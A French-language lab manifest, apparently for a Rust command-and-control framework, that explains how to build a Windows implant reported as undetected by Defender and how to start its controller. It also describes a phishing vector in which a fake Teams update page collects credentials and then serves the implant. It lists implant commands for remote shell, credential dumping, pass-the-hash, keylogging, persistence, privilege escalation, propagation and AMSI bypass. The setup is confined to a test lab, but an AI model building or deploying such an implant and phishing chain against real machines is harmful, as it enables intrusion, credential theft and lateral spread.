# Manifest labo s0P0wn3d (Rust)

## Topologie

| Rôle | Machine | IP | Remarque |
|------|---------|-----|---------|
| Attaquant | Windows 11 (host) + WSL2 | `10.0.0.1` | Interface `vEthernet (s0p0wn3d)` |
| Cible | VM Windows 10 22H2 | `10.0.0.x` | Switch Hyper-V `s0p0wn3d` |

WSL2 en mode **miroir réseau** (`networkingMode=mirrored`) — le controller Linux partage l'IP `10.0.0.1` directement, sans portproxy.

## Prérequis hôte (une seule fois)

```powershell
# En Administrateur
lab\setup_attacker.ps1
```

Ajoute la règle firewall `s0P0wn3d-C2-8443` : TCP 8443 entrant depuis `10.0.0.0/24`.

## Prérequis VM cible (une seule fois, avant snapshot)

```powershell
# En Administrateur sur la VM
lab\setup_target.ps1
```

Crée le compte `svc_backup / P@ssw0rd2024!` et active la journalisation. **Prendre le snapshot `clean-target` juste après.**

## Build de l'implant

```bash
cd /app/virology-rs
source ~/.cargo/env
C2_URL=https://10.0.0.1:8443 \
C2_FINGERPRINT=7B89FA2349281AA336B7A87BAF71377A0B83D99CB9367DC54C27C11353F8FDD1 \
cargo build --release -p implant --target x86_64-pc-windows-gnu
```

Binaire produit : `target/x86_64-pc-windows-gnu/release/implant.exe` (~1,6 Mo, Defender non détecté).

## Démarrage du controller

```bash
cd /app/virology-rs
source ~/.cargo/env
cargo build --release -p controller
./target/release/controller \
  --port 8443 \
  --cert certs/server.crt \
  --key  certs/server.key \
  --payload /chemin/vers/implant.exe
```

## Vecteur d'infection (démo réaliste)

1. Servir la page de phishing Teams via `--payload` → le controller expose `/update` + `/dl`
2. L'utilisateur cible visite `https://10.0.0.1:8443/update`, entre ses identifiants
3. La page redirige vers `/dl` qui télécharge `implant.exe`
4. L'utilisateur exécute le fichier téléchargé
5. L'implant se connecte automatiquement — **aucune configuration réseau requise côté cible**

## Nettoyage après démo

```powershell
# En Administrateur sur l'hôte
lab\cleanup_host.ps1
```

Supprime les règles firewall, portproxy éventuels et les binaires dans `C:\Users\Public\`.

## Commandes C2 disponibles

```
shell <cmd>          bshell <cmd>         persist / unpersist
creds                credsmachine         crack <hash> <dico>
pth <hash> <user>    keylog start|stop|dump
screenshot           loot                 privesc
rdp                  propagate            syscall amsi|ntqsi
logroll              whatever             detect
avscan               download <chemin>    upload <local> <distant>
run <script_b64>
```
